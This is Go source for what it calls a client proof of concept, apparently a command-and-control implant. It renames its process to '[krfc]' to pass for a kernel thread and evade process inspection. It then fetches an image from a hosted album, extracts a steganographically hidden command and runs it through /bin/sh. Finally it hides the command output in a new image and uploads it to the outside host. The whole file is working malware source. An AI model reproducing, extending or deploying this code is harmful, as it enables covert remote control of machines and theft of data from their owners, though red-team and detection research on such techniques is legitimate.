package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"unsafe"

	_ "image/jpeg"

	// Internal libs
	"github.com/AntiMatter/cmd"

	// External libs
	stego "github.com/auyer/steganography"
	"github.com/fatih/color"
)

var clientOptions = map[string]string{"ClientID": "", "AlbumID": ""}
var imageMem string

/*
TODO:
	Allow to hard code the delete hash to upload response

*/

// ChangeProcName is a function that hooks argv[0] and renames it
// This will stand out to filesystem analysis such as lsof and the /proc directory
func ChangeProcName(name string) error {
	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
	n := copy(argv0, name)
	if n < len(argv0) {
		argv0[n] = 0
	}

	return nil
}

// getTasking is the client grabbing the tasking configured for it
func getTasking(albumID string, clientID string) (out []uint8) {
	clientID = clientOptions["ClientID"]

	linkImage := cmd.GetLinkClient(albumID, clientID)

	response, e := http.Get(linkImage)
	if e != nil {
		log.Print(e)
	}
	defer response.Body.Close()

	contents, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println(err)
	}
	//fmt.Println(string(contents))
	imageMem = string(contents)
	//fmt.Println(imageMem)

	fmt.Println(color.GreenString("Response") + ":")
	fmt.Println(" ")

	// returns the decoded message
	task := cmd.DecodeImage(contents)
	fmt.Println(task)
	fmt.Println(" ")
	out, err = exec.Command("/bin/sh", "-c", task).Output()
	if err != nil {
		fmt.Println("Error running commmand: ", err)
	}

	return out

}

// encodeOutput will take the command output and encode it into another image (in memory?) and upload it to the configured album
// Need to encode variable `out` into `imageMem`
func encodeOutput() {
	out := getTasking(clientOptions["AlbumID"], clientOptions["ClientID"])
	fmt.Println(color.GreenString("Output:"))
	fmt.Println(" ")
	fmt.Printf("%s", out)
	fmt.Println(" ")

	// func CreateImage(command string, origPic string, newPic string)
	//cmd.CreateImage(string(out))

	// Confirmed that this is the valid image we want
	imageMem := cmd.GrabRandomImage()

	// Confirmed that this actually does encode the output into the image downloaded
	// For some reason I can write this image data to disk and decode it no problem
	w := new(bytes.Buffer)
	err := stego.Encode(w, imageMem, []byte(out))
	if err != nil {
		fmt.Println("What ~Stego~:", err)
	}

	// Create TmpFile
	tmpfile, err := ioutil.TempFile("", "resp")
	if err != nil {
		fmt.Println("What ~tempFile~: ", err)
	}
	// Clean up
	defer os.Remove(tmpfile.Name())

	// Write data to tmpFile
	if _, err := tmpfile.Write(w.Bytes()); err != nil {
		fmt.Println("What ~WriteTmpFile~: ", err)
	}
	if err := tmpfile.Close(); err != nil {
		fmt.Println("What ~closeTmpFile~: ", err)
	}

	fmt.Print("Please enter the Album-DeleteHash to upload response to >> ")
	reader2 := bufio.NewReader(os.Stdin)
	albumDeleteHash, err := reader2.ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}
	albumDeleteHash = strings.TrimSuffix(albumDeleteHash, "\n")

	// This is reading the contents of the test TempFile
	imageData, err := ioutil.ReadFile(tmpfile.Name())
	if err != nil {
		fmt.Println("What ~ReadTmpFile~: ", err)
	}

	// This method works, maybe I'll try tempfile again...tempfile worked after b64-encoding it

	//f, _ := os.Open("rando.jpg")

	reader := bytes.NewReader(imageData)
	content, _ := ioutil.ReadAll(reader)

	encoded := base64.StdEncoding.EncodeToString(content)

	cmd.UploadImage(encoded, "Response", albumDeleteHash, "Within this is a response", clientOptions["ClientID"])

}

func main() {

	// Keep in mind the binary name has to be at least as long if not longer than your desired name
	err := ChangeProcName("[krfc]")
	if err != nil {
		fmt.Println(err.Error())
	}

	albumID := flag.String("album-id", "", "The album ID to retrieve tasking and upload responses")
	clientID := flag.String("client-id", "", "The client ID of the user / albums")

	flag.Parse()

	fmt.Println("This is the client PoC...")

	reader := bufio.NewReader(os.Stdin)
	if *clientID == "" {
		fmt.Print("Please enter the Client-ID >> ")
		// ReadString will block until the delim is entered
		clientID, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("An error occured while reading input: ", err)
			os.Exit(1)
		}
		// Remove the delim from the string
		clientID = strings.TrimSuffix(clientID, "\n")

		clientOptions["ClientID"] = clientID
	} else {
		clientOptions["ClientID"] = *clientID
	}

	// Check to see if the flag was set or not, if not then prompt user to enter value
	if *albumID == "" {
		fmt.Print("Please enter the AlbumID >> ")
		albumID, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("An error occured while reading input: ", err)
			os.Exit(1)
		}
		albumID = strings.TrimSuffix(albumID, "\n")

		clientOptions["AlbumID"] = albumID
	} else {
		clientOptions["AlbumID"] = *albumID
	}
	encodeOutput()
}
